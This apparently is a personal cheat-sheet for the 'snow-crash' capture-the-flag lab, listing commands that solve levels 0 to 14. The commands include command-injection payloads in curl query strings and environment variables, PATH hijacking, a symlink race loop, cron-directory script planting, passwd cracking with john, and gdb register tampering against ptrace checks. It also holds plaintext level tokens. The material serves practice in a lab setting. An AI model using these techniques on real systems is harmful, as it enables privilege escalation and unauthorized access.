# snow-crash

# Levels:

## 0.
getent passwd
ll -R / 2>dev/null | grep flag00
find / -user flag00 2>/dev/null

cat /usr/sbin/john
su flag00
getflag
su level01

## 1.
find / -name 'passwd' 2>/dev/null
cat /etc/passwd | grep flag01
scp -P 5000 level00@192.168.56.1:/../../../etc/passwd . # scp - secure copy
.\Downloads\john\run\john.exe --show .\passwd

## 2.
scp -P 5000 scp://level02@localhost/level02.pcap C:/Users/Vlad/snow-crash
chmod 777 level02.pcap 
# open Wireshark -> any TCP packet -> follow -> TCP Stream : ft_waNDReL0L
tcpdump -n -r level02.pcap -Xq

## 3.
ll # level03 can execute other commands with high privelage
ltrace ./level03
env # the list of environmental variables
echo getflag > /tmp/echo && chmod +x /tmp/echo # aliasing getflag
export PATH=/tmp:$PATH # start from the directory with alias
./level03

## 4.
netstat -tl
curl localhost:4747?x=\`getflag\`
curl 'localhost:4747?x=`getflag`'

## 5.
find / -name 'level05'  2>/dev/null
env

cat /var/mail/level05 # open crontab file
cat $MAIL

cat  /usr/sbin/openarenaserver
echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && sleep 121 && cat /tmp/flag 
echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && cat /tmp/flag 

## 6.
echo '[x {${exec(getflag)}}]' > /tmp/boo ; ./level06 /tmp/boo
echo '[x ${`getflag`}]' > /tmp/boo ; ./level06 /tmp/boo

## 7.
ltrace ./level07
echo $LOGNAME
export LOGNAME=\`getflag\` ; ./level07
export LOGNAME='$(getflag)' ; ./level07

## 8.
ltrace ./level08 token
chmod 777 .
ln -s token my_tok && ./level08 my_tok
su flag08 #quif5eloekouj29ke0vouxean
getflag

## 9.
scp -P 5000 scp://level09@localhost/token C:/Users/Vlad/snow-crash
python break.py `cat token`

su flag09 F3iji1ju5yuevaus41q1afiuq
getflag

## 10.
strings ./level10 | grep 'Connecting' # shows the port
while true; do ln -fs ~/level10 /tmp/fake; ln -fs ~/token /tmp/fake; done # alternation of links between two files
while true; do ./level10 /tmp/fake 127.0.0.1; done # using binary
nc -l 6969 

## 11.
cat level11.lua
nc -zv localhost 5151 # scan if port is open, not necessary, -z - port scanning
nc localhost 5151 # create TCP connection
; getflag > /tmp/f11 # send in password

$(getflag) > /tmp/f11 # send in password
cat /tmp/f11

## 12.
echo "getflag > /tmp/token" > /tmp/XX && chmod +x /tmp/XX
curl  http://localhost:4646?x='$(/*/XX)'
#curl http://localhost:4646?x=\`/*/XX\`

cat /tmp/token

## 13.
./ltrace ./level13
id # get your id
objdump -d level13

gdb ./level13
b getuid
r # run

set $eax=4242 # or 0x1092 - change register
c # continue

#or
jump *0x80485cb

## 14.
cat /etc/passwd # get the number of the level
id

gdb getflag
disass main

b *(main + 72) # overcome prtace defence
b *(main + 444) # put correct ID in eax
r
info register $eax # -1
set $eax=0
n # next step
set $eax=3014
c